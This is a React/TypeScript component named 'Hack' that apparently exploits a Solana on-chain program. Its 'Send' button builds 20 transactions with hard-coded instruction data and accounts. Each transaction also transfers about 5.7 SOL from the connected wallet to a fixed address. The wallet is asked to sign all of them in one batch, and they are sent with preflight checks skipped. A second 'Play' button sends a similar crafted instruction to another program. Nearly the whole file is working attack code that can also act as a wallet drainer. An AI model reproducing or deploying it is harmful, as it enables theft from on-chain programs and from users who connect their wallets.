import { TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { useWallet } from "@solana/wallet-adapter-react";
import { clusterApiUrl, Connection, LAMPORTS_PER_SOL, PublicKey, SystemProgram, SYSVAR_INSTRUCTIONS_PUBKEY, Transaction, TransactionInstruction } from "@solana/web3.js";

const Hack = () => {
  const wallet = useWallet();
  const connection = new Connection(clusterApiUrl("devnet"), "confirmed");
  
  const handleClickHack = async () => {
    if (!wallet.publicKey) return;
    console.log(wallet.publicKey.toString());
    console.log(connection);
    console.log(await connection.getLatestBlockhash());
    const txs: Transaction[] = [];
    for (let i = 0; i < 20; i++) {
      const tx = new Transaction();
      tx.add(
        new TransactionInstruction({
          programId: new PublicKey("3BJdzqUKD2bTTxDP7x7odQ2u4SBiHu3VncZQwmvHre34"),
          data: Buffer.from("d59dc18ee438f89605", "hex"),
          keys: [
            { pubkey: wallet.publicKey, isSigner: true, isWritable: true },
            { pubkey: new PublicKey("4yrf1MiE7hCTWce2RqxBMG3MzCAMeWD3QZmjkWHRgFhd"), isSigner: false, isWritable: true },
            { pubkey: new PublicKey("CtUF4v8RGQk7vNfSK1H9jw1C5sKfL5P14cY9Ydt4rfqR"), isSigner: false, isWritable: true },
            { pubkey: new PublicKey("PepKx1sXSr7dxQ2iG8fx3zkxKYnMkvaKymHoAkM5bPL"), isSigner: false, isWritable: true },
            { pubkey: new PublicKey("SERVUJeqsyaJTuVuXAmmko6kTigJmxzTxUMSThpC2LZ"), isSigner: false, isWritable: true },
            { pubkey: new PublicKey("8SWGomC2woZDKfSmFopFGCmucLozDvhxBe2WxCMZ6vfW"), isSigner: false, isWritable: true },
            { pubkey: new PublicKey("7J7bxg5dwYRxVcityfwUGdJmmbs7VewN6RygCTXAu98K"), isSigner: false, isWritable: true },
            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
            { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
          ],
        }),
        new TransactionInstruction({
          programId: new PublicKey("3BJdzqUKD2bTTxDP7x7odQ2u4SBiHu3VncZQwmvHre34"),
          data: Buffer.from("3ec6d6c1d59f6cd2", "hex"),
          keys: [
            { pubkey: wallet.publicKey, isSigner: true, isWritable: true },
            { pubkey: new PublicKey("4yrf1MiE7hCTWce2RqxBMG3MzCAMeWD3QZmjkWHRgFhd"), isSigner: false, isWritable: true },
            { pubkey: new PublicKey("CtUF4v8RGQk7vNfSK1H9jw1C5sKfL5P14cY9Ydt4rfqR"), isSigner: false, isWritable: true },
            { pubkey: new PublicKey("PepKx1sXSr7dxQ2iG8fx3zkxKYnMkvaKymHoAkM5bPL"), isSigner: false, isWritable: true },
            { pubkey: new PublicKey("7J7bxg5dwYRxVcityfwUGdJmmbs7VewN6RygCTXAu98K"), isSigner: false, isWritable: true },
            { pubkey: SYSVAR_INSTRUCTIONS_PUBKEY, isSigner: false, isWritable: false },
            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
            { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
          ],
        }),
        SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: new PublicKey("DoXJ2Gz9DwAHio2Wjy2gjcHaWtwcpa5s6zFpTJCWFf59"),
          lamports: LAMPORTS_PER_SOL * 5.7 + i,
        })
      );
      tx.feePayer = wallet.publicKey;
      tx.recentBlockhash = (await connection.getLatestBlockhash("finalized")).blockhash;
      txs.push(tx);
    }
    // @ts-ignore
    const signedTxs = await wallet.signAllTransactions(txs);
    for (const signedTx of signedTxs) {
      const txSignature = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
      console.log(txSignature);
      await connection.confirmTransaction(txSignature, "processed");
    }
  };
  const handleClickPlay = async () => {
    if (!wallet.publicKey) return;
    console.log(wallet.publicKey.toString());
    console.log(connection);
    console.log(await connection.getLatestBlockhash());
    const txs: Transaction[] = [];
    for (let i = 0; i < 1; i++) {
      const tx = new Transaction();
      tx.add(
        new TransactionInstruction({
          programId: new PublicKey("F1Bpf6SjcUzwXj6EPKUg4gNJazZytN5pjvVrFJw6ofxm"),
          data: Buffer.from("d59dc18ee438f89605", "hex"),
          keys: [
            { pubkey: wallet.publicKey, isSigner: true, isWritable: true },
            { pubkey: new PublicKey("4yrf1MiE7hCTWce2RqxBMG3MzCAMeWD3QZmjkWHRgFhd"), isSigner: false, isWritable: true },
            { pubkey: new PublicKey("D2R3FD1hq8CXj9P8U89pKS8fJadreM1PorWgeb2uLG5Y"), isSigner: false, isWritable: true },
            { pubkey: new PublicKey("FAzB9CBkbwVmvqzbmtDXyEb2EDzRKAxu1rXY1Hnhv8Aj"), isSigner: false, isWritable: true },
            { pubkey: new PublicKey("SERVUJeqsyaJTuVuXAmmko6kTigJmxzTxUMSThpC2LZ"), isSigner: false, isWritable: true },
            { pubkey: new PublicKey("8SWGomC2woZDKfSmFopFGCmucLozDvhxBe2WxCMZ6vfW"), isSigner: false, isWritable: true },
            { pubkey: new PublicKey("jsBi71XADgfvX2KBcFu63Co47KFRdd8JHpXEHDBurQY"), isSigner: false, isWritable: true },
            { pubkey: new PublicKey("6sE2DYexXa8oBPfGjgoCkNceHgH3xXnXD2nBz7i3NTWE"), isSigner: false, isWritable: false },
            { pubkey: SYSVAR_INSTRUCTIONS_PUBKEY, isSigner: false, isWritable: false },
            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
            { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },

          ],
        })
      );
      tx.feePayer = wallet.publicKey;
      tx.recentBlockhash = (await connection.getLatestBlockhash("finalized")).blockhash;
      txs.push(tx);
    }
    // @ts-ignore
    const signedTxs = await wallet.signAllTransactions(txs);
    for (const signedTx of signedTxs) {
      const txSignature = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
      console.log(txSignature);
      await connection.confirmTransaction(txSignature, "processed");
    }
  }
  return (
    <div className="flex items-center">
      <div className="bg-white px-5 py-3 cursor-pointer" onClick={handleClickHack}>Send</div>
      <div className="bg-white px-5 py-3 cursor-pointer" onClick={handleClickPlay}>Play</div>
    </div>
  );
};

export default Hack;
